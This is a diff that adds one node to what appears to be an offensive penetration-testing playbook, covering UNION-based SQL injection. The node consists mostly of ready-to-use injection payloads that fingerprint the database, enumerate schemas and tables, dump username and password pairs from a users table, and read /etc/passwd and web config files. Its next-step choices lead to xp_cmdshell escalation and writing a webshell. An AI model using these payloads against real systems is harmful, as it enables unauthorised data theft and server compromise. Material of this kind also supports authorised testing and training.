@@ -1,0 +1,26 @@
+{
+  "id": "sqli_union",
+  "phase": "WEB",
+  "title": "SQLi — UNION-Based Extraction",
+  "body": "Append your SELECT to the original query. PortSwigger: requires matching column count and compatible types. Most reliable extraction when columns are visible in response. Suppress original rows with AND 1=0.",
+  "cmd": "# Prerequisites: column count known, string column found\n# Assume 3 columns, column 2 is string:\n\n# -- DATABASE FINGERPRINT -----------------\n' UNION SELECT NULL,version(),NULL--\n' UNION SELECT NULL,database(),NULL--\n' UNION SELECT NULL,user(),NULL--\n\n# -- ENUMERATE STRUCTURE ------------------\n# All databases\n' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--\n\n# Tables in current DB\n' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--\n\n# Columns in users table\n' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--\n\n# -- DUMP CREDENTIALS ---------------------\n' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--\n\n# If original query returns rows (swallows yours):\n' AND 1=0 UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--\n\n# -- FILE READ ----------------------------\n' UNION SELECT NULL,load_file('/etc/passwd'),NULL--\n' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--\n' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--\n\n# -- MSSQL UNION --------------------------\n' UNION SELECT NULL,@@version,NULL--\n' UNION SELECT NULL,name,NULL FROM master..sysdatabases--\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+  "warn": "If UNION returns nothing but no error: the original query returns multiple rows, drowning yours. Add AND 1=0 to kill the original results. If still nothing: column types don't match — try casting: cast(version() as varchar).",
+  "choices": [
+    {
+      "label": "Dumped credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "FILE read working — hunting configs",
+      "next": "sqli_shell"
+    },
+    {
+      "label": "MSSQL — escalate to xp_cmdshell",
+      "next": "mssql"
+    },
+    {
+      "label": "Write webshell via INTO OUTFILE",
+      "next": "sqli_shell"
+    }
+  ]
+}
